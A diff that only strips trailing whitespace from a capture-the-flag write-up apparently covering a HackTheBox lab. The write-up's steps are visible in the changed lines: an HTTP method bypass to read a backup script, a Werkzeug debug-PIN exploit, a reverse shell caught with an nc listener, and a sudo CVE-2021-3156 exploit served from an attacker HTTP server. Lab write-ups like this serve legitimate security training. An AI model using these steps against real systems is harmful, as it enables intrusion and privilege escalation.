@@ -114,7 +114,7 @@ Flag 2: AKERVA{IkN0...nS}
 We see that '/var/www/html/scripts/backup_every_17minutes.sh' is running, let's check.
 
 ```bash
-kali@kali:curl -X GET http://10.13.37.11/scripts/backup_every_17minutes.sh                                                                               
+kali@kali:curl -X GET http://10.13.37.11/scripts/backup_every_17minutes.sh
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
 <title>401 Unauthorized</title>
@@ -134,7 +134,7 @@ the credentials required.</p>
 We get 401 unauthorized with GET request, let's see if other methods are allowed.
 
 ```bash
-kali@kali:curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh                                                                               
+kali@kali:curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh
 #!/bin/bash
 #
 # This script performs backups of production and development websites.
@@ -165,7 +165,7 @@ Flag 3: AKERVA{IK.....G_==}
 We see that, the backup archive can be determined as it is just the system date.
 
 ```bash
-kali@kali:curl -I 10.13.37.11 | grep -i Date                                                                                  
+kali@kali:curl -I 10.13.37.11 | grep -i Date
   % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                  Dload  Upload  Total   Spent   Left   Speed
   0      0   0      0   0      0      0      0           00:01              0
@@ -215,14 +215,14 @@ backup_20260219074203.zip     100%[=======================================>]  21
 Extract the zip.
 
 ```bash
-kali@kali:ls                                                                                                                  
+kali@kali:ls
 backup_20260219074203.zip  var
 ```
 
 Let's see if we can get anything from the source code.
 
 ```bash
-kali@kali:cat space_dev.py                                                                                                    
+kali@kali:cat space_dev.py
 #!/usr/bin/python
 
 from flask import Flask, request
@@ -334,8 +334,8 @@ MAC Address: 00:50:56:94:0d:02
 We have MAC Address, let's convert it to decimal value using python.
 
 ```bash
-kali@kali:python                                                                                                              
-Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0] on linux                                                      
+kali@kali:python
+Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0] on linux
 Type "help", "copyright", "credits" or "license" for more information.
 >>> print(0x5056940d02)
 345049926914
@@ -344,7 +344,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 Edit all the required fields, in the exploit and run.
 
 ```bash
-kali@kali:python3 exploit.py                                                                                                     
+kali@kali:python3 exploit.py
 285-691-244
 ```
 Let's login with the pin we got from the exploit to login to /console.
@@ -364,8 +364,8 @@ You can use any python reverse shell on the console.
 
 ```bash
 kali@kali:nc -nlvp 4444
-listening on [any] 4444 ...                                                                                                                   
-connect to [10.10.16.8] from (UNKNOWN) [10.13.37.11] 47152                                                                                    
+listening on [any] 4444 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.13.37.11] 47152
 aas@Leakage:~$ id
 id
 uid=1000(aas) gid=1000(aas) groups=1000(aas),24(cdrom),30(dip),46(plugdev)
@@ -422,7 +422,7 @@ We can get the exploit code from "*https://github.com/worawit/CVE-2021-3156*".
 Run python server on attacker machine.
 
 ```bash
-kali@kali:python3 -m http.server 80                                                                                                                 
+kali@kali:python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
